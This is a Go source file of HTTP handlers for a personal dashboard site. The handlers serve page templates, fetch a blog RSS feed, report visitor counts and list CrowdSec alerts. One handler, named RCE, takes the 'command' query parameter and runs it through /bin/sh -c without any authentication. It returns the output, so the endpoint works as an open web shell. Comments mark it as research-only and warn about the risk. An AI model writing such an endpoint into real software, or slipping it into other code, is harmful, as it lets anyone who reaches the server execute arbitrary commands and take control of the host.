package handlers

import (
	"encoding/json"
	"encoding/xml"
	"net/http"
	"os/exec"
	"example.com/collector"
	"example.com/db"
)

// RSS 구조체 (tistory에서 정보 긁어오기)
type RSSFeed struct {
	Channel RSSChannel `xml:"channel"`
}

type RSSChannel struct {
	Items []RSSItem `xml:"item"`
}

type RSSItem struct {
	Title    string `xml:"title"`
	Link     string `xml:"link"`
	PubDate  string `xml:"pubDate"`
	Category string `xml:"category"`
}

// 페이지 핸들러
func IndexPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "../frontend/templates/index.html")
}

// 아직 사용 X 추후에 서버 네트워크 구상도 만들어둘 예정
func StackPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "../frontend/templates/stack.html")
}
// Logs -> 자세히 보기
func LogsPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "../frontend/templates/logs.html")
}

// Blog RSS 핸들러
//
func GetBlog(w http.ResponseWriter, r *http.Request) {
	//요청
	rssResp, err := http.Get("https://poiri3r.tistory.com/rss")
	//에러처리
	if err != nil {
		http.Error(w, "RSS 요청 실패", http.StatusInternalServerError)
		return
	}
	//http 요청을 열고 끝나면 바로 닫음
	defer rssResp.Body.Close()

	//incoding/json의 RSSfeed타입 변수
	var feed RSSFeed
	//bodyt를 xml 디코더로 만들고 읽어서 feed에 채워넣기
	if err := xml.NewDecoder(rssResp.Body).Decode(&feed); err != nil {
		http.Error(w, "RSS 파싱 실패", http.StatusInternalServerError)
		return
	}
	//blogpost 구조체에는 제목 링크 날짜, 링크는 하이퍼링크용
	type BlogPost struct {
		Title   string `json:"title"`
		Link    string `json:"link"`
		PubDate string `json:"pub_date"`
	}

	//BlogPost 타입의 슬라이스 선언
	var posts []BlogPost
	for _, item := range feed.Channel.Items {
		posts = append(posts, BlogPost{
			Title:   item.Title,
			Link:    item.Link,
			PubDate: item.PubDate,
		})
	}

	//인코딩하여 전송
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(posts)
}

//방문자 요약 구조체 : 하루 방문자, 악성 시도, 차단된 ip
type visitorSummaryResponse struct {
	TodayVisitors     int `json:"today_visitors"`
	MaliciousAttempts int `json:"malicious_attempts"`
	BlockedIPs        int `json:"blocked_ips"`
}

//로그를 기록한 DB에서 읽어오는 함수
func GetVisitorSummary(w http.ResponseWriter, r *http.Request) {
	//resp라는 방문자구조체 생성
	var resp visitorSummaryResponse
	//Scan으로 읽어온 값을 바로 구조체에 채워둠
	//visitor_cache는 항상 한 행만 유지
	db.DB.QueryRow(`
		SELECT today_visitors, malicious_attempts, blocked_ips
		FROM visitor_cache WHERE id = 1
	`).Scan(&resp.TodayVisitors, &resp.MaliciousAttempts, &resp.BlockedIPs)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

//collect.go에 구현된 ParseRecentLogs로 최근 100개의 로그를 읽어옴
//현재 기준으로는 logs 페이지에 로그만 뜨는데 대쉬보드 구현 이후에는 개수를 낮추고 페이지 형식으로 구현 예정
func GetVisitorDetail(w http.ResponseWriter, r *http.Request) {
	entries := collector.ParseRecentLogs(500)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(entries)
}

// 대시보드 그래프 데이터 (방문자 국가, 공격 국가, 트래픽 비율, 차단 이유)
func GetDashboard(w http.ResponseWriter, r *http.Request) {
	data := collector.FetchDashboard()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

// CrowdSec 알럿 상세 목록
func GetCrowdsecAlerts(w http.ResponseWriter, r *http.Request) {
	entries := collector.FetchAlertList(200)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(entries)
}

// [연구 전용] GET 기반 RCE 엔드포인트 — /RCE/?command=ls -al
//
// 경고: command 쿼리 파라미터를 셸에 그대로 전달해 임의 명령을 실행한다.
// 인증이 전혀 없으므로 접근 가능한 누구나 서버에서 명령을 실행할 수 있다.
// 반드시 민감정보 없는 격리된 테스트 서버에서만 사용할 것.
func RCE(w http.ResponseWriter, r *http.Request) {
	//command 파라미터 추출
	command := r.URL.Query().Get("command")
	if command == "" {
		http.Error(w, "command 파라미터가 필요합니다 (예: /RCE/?command=ls -al)", http.StatusBadRequest)
		return
	}

	//셸을 통해 실행 (파이프/리다이렉트 등 셸 문법 지원). 표준출력+표준에러 모두 수집
	out, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()

	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	//실행 에러(0이 아닌 종료코드 등)여도 출력은 함께 반환
	w.Write(out)
	if err != nil {
		w.Write([]byte("\n[error] " + err.Error()))
	}
}

//새로고침 로직 : collect.Collect 즉시 실행
func RefreshVisitorSummary(w http.ResponseWriter, r *http.Request) {
	s := collector.Collect()
	resp := visitorSummaryResponse{
		TodayVisitors:     s.TodayVisitors,
		MaliciousAttempts: s.MaliciousAttempts,
		BlockedIPs:        s.BlockedIPs,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}
